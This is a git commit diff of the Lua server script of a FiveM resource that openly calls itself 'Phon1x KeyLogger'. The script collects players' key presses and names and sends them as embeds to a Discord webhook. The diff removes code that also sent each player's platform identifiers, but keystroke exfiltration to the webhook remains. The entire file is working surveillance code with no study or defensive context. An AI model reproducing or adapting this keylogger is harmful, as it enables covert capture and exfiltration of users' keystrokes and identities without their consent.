2f76af388a1d7f56ba89b1ce8502636d11f1f382
Phon1xeu <phonixjegood@gmail.com>
2025-09-02 15:00:43 +0200

    Fixed

--- server.lua
+++ server.lua
@@ -1,31 +1,26 @@
-local webhook = "YOURWEBHOOK"
+local webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK"
 
 RegisterServerEvent("keylogger:logKey")
 AddEventHandler("keylogger:logKey", function(key)
     local src = source
     local name = GetPlayerName(src)
 
-    -- Identifikátory
-    local identifiers = {}
-    for k,v in pairs(GetPlayerIdentifiers(src)) do
-        table.insert(identifiers, v)
-    end
-    local idString = table.concat(identifiers, "\n")
 
-    -- Embed na webhook
     local embed = {
         {
             ["title"] = "🔑 Key Press Detected",
-            ["color"] = 16711680, 
+            ["color"] = 16753920,
             ["fields"] = {
                 { ["name"] = "Player", ["value"] = name .. " ("..src..")", ["inline"] = false },
-                { ["name"] = "Key", ["value"] = key, ["inline"] = true },
-                { ["name"] = "Identifiers", ["value"] = "```\n"..idString.."```", ["inline"] = false }
+                { ["name"] = "Key", ["value"] = key, ["inline"] = true }
             },
             ["footer"] = { ["text"] = "Phon1x KeyLogger" },
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }
     }
 
-    PerformHttpRequest(webhook, function(err, text, headers) end, "POST", json.encode({username = "KeyLogger", embeds = embed}), { ["Content-Type"] = "application/json" })
+    PerformHttpRequest(webhook, function(err, text, headers) end, "POST", json.encode({
+        username = "KeyLogger",
+        embeds = embed
+    }), { ["Content-Type"] = "application/json" })
 end)
